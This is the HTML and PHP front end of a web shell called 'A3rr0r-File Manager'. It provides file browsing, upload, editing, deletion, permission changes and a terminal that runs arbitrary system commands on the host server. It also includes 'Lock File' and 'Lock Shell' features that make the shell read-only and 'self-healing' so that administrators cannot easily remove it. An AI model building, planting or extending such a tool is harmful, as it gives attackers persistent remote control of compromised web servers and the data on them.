{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(9,9,11,0.8);z-index:1000;justify-content:center;align-items:center;backdrop-filter:blur(4px);} .modal-content {background-color:#18181b;padding:32px;border-radius:12px;border:1px solid #27272a;width:90%;max-width:500px;animation:modalFadeIn 0.2s ease-out;color:#fafafa;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);} @keyframes modalFadeIn {from {opacity:0;transform:scale(0.95);} to {opacity:1;transform:scale(1);}} .modal-content.modal-lg {max-width:800px;height:85vh;display:flex;flex-direction:column;} .modal-title {font-size:1.25rem;margin-bottom:24px;font-weight:600;color:#fafafa;letter-spacing:-0.025em;} .modal-form {display:flex;flex-direction:column;gap:16px;} .editor-form {display:flex;flex-direction:column;gap:16px;flex-grow:1;} .form-group {display:flex;flex-direction:column;gap:8px;} .form-group label {font-weight:500;font-size:0.875rem;color:#a1a1aa;} .form-group input, .form-group textarea {padding:10px 14px;border:1px solid #27272a;border-radius:6px;background-color:#09090b;color:#fafafa;font-size:0.875rem;transition:border-color 0.2s;} .form-group input:focus, .form-group textarea:focus {border-color:#52525b;outline:none;} .form-group textarea {flex-grow:1;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:13px;resize:none;line-height:1.6;} .modal-actions {display:flex;justify-content:flex-end;gap:10px;margin-top:24px;} .btn-cancel {background-color:transparent;color:#a1a1aa;border:1px solid #27272a;} .btn-cancel:hover {background-color:#27272a;color:#fafafa;} .alert {border-radius:8px;font-weight:500;font-size:0.875rem;display:flex;align-items:center;justify-content:center;text-align:center;gap:10px;} .alert-success {background-color:rgba(22,163,74,0.1);color:#4ade80;border:1px solid rgba(22,163,74,0.2);} .alert-error {background-color:rgba(220,38,38,0.1);color:#f87171;border:1px solid rgba(220,38,38,0.2);} .alert-warning {background-color:rgba(217,119,6,0.1);color:#fbbf24;border:1px solid rgba(217,119,6,0.2);} .btn-lock-file {background-color:#18181b;color:#fbbf24;border:1px solid #451a03;} .btn-lock-file:hover {background-color:#451a03;border-color:#78350f;} .btn-lock-shell {background-color:#18181b;color:#f87171;border:1px solid #450a0a;} .btn-lock-shell:hover {background-color:#450a0a;border-color:#7f1d1d;} .loading-overlay {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(9,9,11,0.8);z-index:2000;justify-content:center;align-items:center;} .spinner {width:40px;height:40px;border:3px solid #27272a;border-top:3px solid #fafafa;border-radius:50%;animation:spin 0.8s linear infinite;} @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}} .lock-badge {display:inline-flex;align-items:center;gap:4px;background-color:rgba(220,38,38,0.1);color:#f87171;font-size:0.65rem;font-weight:600;padding:2px 6px;border-radius:4px;margin-left:8px;border:1px solid rgba(220,38,38,0.2);letter-spacing:0.05em;} .perm-locked {color:#f87171;font-weight:500;display:flex;align-items:center;gap:6px;} .action-btn-disabled {background:transparent;border:1px solid transparent;font-size:1rem;color:#3f3f46;width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;border-radius:4px;cursor:not-allowed;} .btn-unlock {background-color:#18181b;color:#4ade80;border:1px solid #052e16;font-size:0.7rem;font-weight:600;padding:0 6px;height:20px;border-radius:4px;cursor:pointer;transition:all 0.2s;display:inline-flex;align-items:center;gap:4px;} .btn-unlock:hover {background-color:#052e16;border-color:#14532d;} @media (max-width: 768px) {.upload-form {flex-direction:column;align-items:stretch;} .section-header {flex-direction:column;align-items:flex-start;gap:16px;} .btn {width:100%;justify-content:center;}}
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div></div>

    <nav class="navbar">
        <div class="container navbar-content">
            <div style="display: flex; align-items: center; gap: 12px;">
                <h1 onclick="navigateTo('<?php echo encryptPath(getcwd()); ?>')" style="cursor: pointer;" title="Go to Home"><span style="color:#f87171;">A3rr0r</span>-File Manager <span class="version">v<?php echo X_FILE_MANAGER_VERSION; ?></span></h1>
                <a href="https://t.me/A3rr0r" target="_blank" class="social-link">
                    <i class="ri-telegram-line" style="color: #a1a1aa; margin-right: 5px; font-size: 1rem;"></i>
                    <span class="label">telegram:</span> <span class="id">@A3rr0r</span>
                </a>
            </div>
            <div class="navbar-actions" style="display: flex; align-items: center;">
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="breadcrumb">
            <div style="display: flex; align-items: center; overflow-x: auto; white-space: nowrap; flex: 1;">
                <i class="ri-folder-open-line" style="color: #a1a1aa; margin-right: 8px;"></i>
                <?php foreach ($breadcrumb_items as $index => $item): ?>
                    <div class="breadcrumb-item">
                        <?php if ($index === count($breadcrumb_items) - 1): ?>
                            <span class="breadcrumb-current"><?php echo htmlspecialchars($item['name']); ?></span>
                        <?php else: ?>
                            <a onclick="navigateTo('<?php echo $item['path']; ?>')" style="cursor:pointer;"><?php echo htmlspecialchars($item['name']); ?></a>
                            <span class="breadcrumb-separator">/</span>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
		
        <?php if ($message): ?><div class="alert alert-success"><i class="ri-checkbox-circle-line"></i> <?php echo $message; ?></div><?php endif; ?>
        <?php if ($error): ?><div class="alert alert-error"><i class="ri-error-warning-line"></i> <?php echo $error; ?></div><?php endif; ?>

        <section class="section">
            <div class="section-header">
                <h2 class="section-title">File Explorer</h2>
                <div class="section-actions" style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
                    <button class="btn btn-sm btn-success" onclick="showCreateFileModal()"><i class="ri-file-add-line"></i> New File</button>
                    <button class="btn btn-sm" onclick="showCreateFolderModal()"><i class="ri-folder-add-line"></i> New Folder</button>
                    <button class="btn btn-sm btn-lock-file"  onclick="showLockFileModal()"><i class="ri-lock-2-line"></i> Lock File</button>
                    <button class="btn btn-sm btn-lock-shell" onclick="confirmLockShell()"><i class="ri-shield-keyhole-line"></i> Lock Shell</button>
                    <?php $dir_writable = is_writable($current_path); ?>
                    <form class="compact-upload" method="post" enctype="multipart/form-data">
                        <input type="file" name="file" class="custom-file-input <?php echo $dir_writable ? 'writable' : 'readonly'; ?>" required style="width: 160px;">
                        <button type="submit" name="upload" class="upload-btn"><i class="ri-upload-cloud-2-line"></i> Upload</button>
                    </form>
                </div>
            </div>
            <div class="file-table-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($current_path !== DIRECTORY_SEPARATOR && $current_path !== substr(getcwd(), 0, 3)): ?>
                        <tr>
                            <td><div class="file-name"><i class="ri-arrow-go-back-line" style="color: #a1a1aa;"></i><a onclick="navigateTo('<?php echo encryptPath(dirname($current_path)); ?>')" style="cursor:pointer;">.. (Parent Directory)</a></div></td>
                            <td>-</td><td>-</td><td>-</td><td>-</td>
                        </tr>
                        <?php endif; ?>
                        <?php foreach ($files as $file): ?>
                        <tr>
                            <td>
                                <div class="file-name">
                                    <span class="<?php echo $file['isDirectory'] ? 'folder-icon' : 'file-icon'; ?>">
                                        <i class="<?php echo $file['isDirectory'] ? 'ri-folder-fill' : 'ri-file-text-line'; ?>"></i>
                                    </span>
                                    <?php if ($file['isDirectory']): ?>
                                        <a onclick="navigateTo('<?php echo $file['path']; ?>')" style="cursor:pointer;"><?php echo htmlspecialchars($file['name']); ?></a>
                                    <?php else: ?>
                                        <span><?php echo htmlspecialchars($file['name']); ?></span>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td><?php echo $file['size']; ?></td>
                            <td>
                                <?php if ($file['isLocked']): ?>
                                    <span style="color: #f87171; font-family: monospace; font-weight: 500;"><i class="ri-lock-fill" style="vertical-align: middle; font-size: 0.85rem;"></i> <?php echo $file['permissions']; ?></span>
                                <?php else: ?>
                                    <span style="color: <?php echo $file['isWritable'] ? '#4ade80' : '#f87171'; ?>; font-family: monospace; font-weight: 500;">
                                        <?php echo $file['permissions']; ?>
                                    </span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $file['lastModified']; ?></td>
                            <td>
                                <div class="action-buttons">
                                    <?php if (!$file['isDirectory']): ?>
                                        <button class="action-btn" title="Download" onclick="downloadFile('<?php echo $file['path']; ?>')"><i class="ri-download-cloud-2-line"></i></button>
                                        <?php if ($file['isEditable']): ?>
                                            <button class="action-btn <?php echo $file['isWritable'] ? '' : 'btn-readonly'; ?>" title="Edit" onclick="showEditFileModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-edit-box-line"></i></button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                    <button class="action-btn <?php echo $file['isWritable'] ? '' : 'btn-readonly'; ?>" title="Rename" onclick="showRenameModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-pencil-line"></i></button>

                                    <?php if ($file['isLocked']): ?>
                                        <span class="action-btn-disabled" title="LOCKED — Chmod change not allowed!"><i class="ri-key-line"></i></span>
                                    <?php else: ?>
                                        <button class="action-btn" title="Permissions" onclick="showPermissionsModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-key-line"></i></button>
                                    <?php endif; ?>

                                    <?php if ($file['isLocked']): ?>
                                        <span class="action-btn-disabled" title="LOCKED — Cannot delete locked file!"><i class="ri-delete-bin-line"></i></span>
                                        <form method="post" style="display:inline;" class="no-loading" onsubmit="if(confirm('Unlock this item and restore permissions?')) { showLoading(); return true; } return false;">
                                            <input type="hidden" name="unlockPath" value="<?php echo $file['path']; ?>">
                                            <button type="submit" name="unlockFile" class="action-btn" title="Unlock" style="color:#4ade80;"><i class="ri-lock-unlock-line"></i></button>
                                        </form>
                                    <?php else: ?>
                                        <form method="post" style="display:inline;" class="no-loading" onsubmit="if(confirm('Permanently delete this <?php echo $file['isDirectory'] ? 'folder' : 'file'; ?>?')) { showLoading(); return true; } return false;">
                                            <input type="hidden" name="path" value="<?php echo $file['path']; ?>">
                                            <button type="submit" name="delete" class="action-btn" title="Delete" style="color:#f87171;"><i class="ri-delete-bin-line"></i></button>
                                        </form>
                                    <?php endif; ?>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </section>
        <section class="terminal-container">
            <div class="terminal-header">
                <span>>_ <span style="color:#f87171;">A3rr0r</span>-terminal v<?php echo X_FILE_MANAGER_VERSION; ?></span>
                <span>Context: <?php echo htmlspecialchars($current_path); ?></span>
            </div>
            <div id="terminalOutput" class="terminal-output">Welcome to <span style="color:#f87171;">A3rr0r</span> Terminal.
All commands will be executed relative to the current directory.
Type 'help' for hints or any system command to begin.</div>
            <div class="terminal-input-group">
                <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter shell command here..." autocomplete="off">
                <button onclick="executeCommand()" class="btn btn-sm btn-success"><i class="ri-terminal-line"></i> Run</button>
            </div>
        </section>
        
        <div style="height: 50px;"></div>
    </div>

    <!-- Modals -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Rename: <span id="renameFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="renameOldPath" name="oldPath">
                <div class="form-group">
                    <label>New Item Name</label>
                    <input type="text" id="renameNewName" name="newName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('renameModal')">Cancel</button>
                    <button type="submit" name="rename" class="btn">Rename Item</button>
                </div>
            </form>
        </div>
    </div>

    <div id="permissionsModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Modify Permissions: <span id="permissionsFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="permissionsPath" name="permPath">
                <div class="form-group">
                    <label>Octal Representation (e.g., 0755 or 0644)</label>
                    <input type="text" name="permissions" placeholder="0755" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('permissionsModal')">Cancel</button>
                    <button type="submit" name="changePermissions" class="btn">Apply Changes</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New File</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Filename (with extension)</label>
                    <input type="text" name="newFileName" placeholder="script.php" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFileModal')">Cancel</button>
                    <button type="submit" name="createFile" class="btn">Create File</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New Folder</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Folder Name</label>
                    <input type="text" name="newFolderName" placeholder="assets" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFolderModal')">Cancel</button>
                    <button type="submit" name="createFolder" class="btn">Create Folder</button>
                </div>
            </form>
        </div>
    </div>

    <div id="lockFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">🔒 Lock File</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>File Path (absolute or relative)</label>
                    <input type="text" name="lockFilePath" id="lockFilePathInput" placeholder="/var/www/html/shell.php" required>
                    <input type="hidden" name="lockFile" value="1">
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('lockFileModal')">Cancel</button>
                    <button type="submit" class="btn btn-lock-file">🔒 Activate Lock</button>
                </div>
            </form>
        </div>
    </div>

    <div id="lockShellModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">🛡️ Lock Shell</h3>
            <p style="margin-bottom:15px;color:#555;font-size:.95rem;">Lock <strong>this shell file itself</strong> (<code><?php echo basename(__FILE__); ?></code>) so it becomes read-only and self-healing.</p>
            <form class="modal-form" method="post">
                <input type="hidden" name="lockShell" value="1">
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('lockShellModal')">Cancel</button>
                    <button type="submit" class="btn btn-lock-shell">🛡️ Yes, Lock This Shell</button>
                </div>
            </form>
        </div>
    </div>

    <div id="editFileModal" class="modal">
        <div class="modal-content modal-lg">
            <h3 class="modal-title">Editor: <span id="editFileName"></span></h3>
            <form class="editor-form" method="post">
                <input type="hidden" id="editFilePath" name="filePath">
                <div class="form-group" style="flex-grow:1; display:flex; flex-direction:column;">
                    <textarea id="fileContent" name="fileContent" required></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('editFileModal')">Cancel</button>
                    <button type="submit" name="saveFile" class="btn">Save Changes</button>
                </div>
            </form>
        </div>
    </div>
    <form id="navigationForm" method="post" style="display:none;"><input type="hidden" name="action" value="navigate"><input type="hidden" id="navigationPath" name="path"></form>
    <form id="downloadForm" method="post" style="display:none;"><input type="hidden" name="action" value="download"><input type="hidden" id="downloadPath" name="path"></form>

    <script>
        function showLoading(){document.getElementById('loadingOverlay').style.display='flex';} function hideLoading(){document.getElementById('loadingOverlay').style.display='none';} function navigateTo(path){showLoading();document.getElementById('navigationPath').value=path;document.getElementById('navigationForm').submit();} function downloadFile(path){document.getElementById('downloadPath').value=path;document.getElementById('downloadForm').submit();} function hideModal(id){document.getElementById(id).style.display='none';} function showRenameModal(path,name){document.getElementById('renameFileName').textContent=name;document.getElementById('renameOldPath').value=path;document.getElementById('renameNewName').value=name;document.getElementById('renameModal').style.display='flex';} function showPermissionsModal(path,name){document.getElementById('permissionsFileName').textContent=name;document.getElementById('permissionsPath').value=path;document.getElementById('permissionsModal').style.display='flex';} function showCreateFileModal(){document.getElementById('createFileModal').style.display='flex';} function showCreateFolderModal(){document.getElementById('createFolderModal').style.display='flex';} function showLockFileModal(){document.getElementById('lockFilePathInput').value='';document.getElementById('lockFileModal').style.display='flex';} function confirmLockShell(){document.getElementById('lockShellModal').style.display='flex';} function showEditFileModal(path,name){document.getElementById('editFileName').textContent=name;document.getElementById('editFilePath').value=path;showLoading();const formData=new FormData();formData.append('action','getContent');formData.append('path',path);fetch(window.location.href,{method:'POST',body:formData}).then(r=>r.text()).then(content=>{document.getElementById('fileContent').value=content;document.getElementById('editFileModal').style.display='flex';hideLoading();}).catch(e=>{hideLoading();alert('Error loading file: '+e);});} function executeCommand(){const cmd=document.getElementById('terminalInput').value;if(!cmd)return;const outputBox=document.getElementById('terminalOutput');const timestamp=new Date().toLocaleTimeString();outputBox.textContent+=`\n[${timestamp}] $ ${cmd}\n`;outputBox.scrollTop=outputBox.scrollHeight;const formData=new FormData();formData.append('action','executeCommand');formData.append('command',cmd);document.getElementById('terminalInput').value='';fetch(window.location.href,{method:'POST',body:formData}).then(r=>r.text()).then(res=>{outputBox.textContent+=res+'\n';outputBox.scrollTop=outputBox.scrollHeight;}).catch(e=>{outputBox.textContent+='Execution Error: '+e+'\n';outputBox.scrollTop=outputBox.scrollHeight;});} document.getElementById('terminalInput').addEventListener('keypress',function(e){if(e.key==='Enter')executeCommand();}); document.querySelectorAll('form').forEach(f=>{f.addEventListener('submit',()=>{if(!f.classList.contains('no-loading')&&f.id!=='navigationForm'&&f.id!=='downloadForm')showLoading();});}); window.onclick=function(event){if(event.target.className==='modal'){event.target.style.display='none';}}
    </script>
</body>
</html>
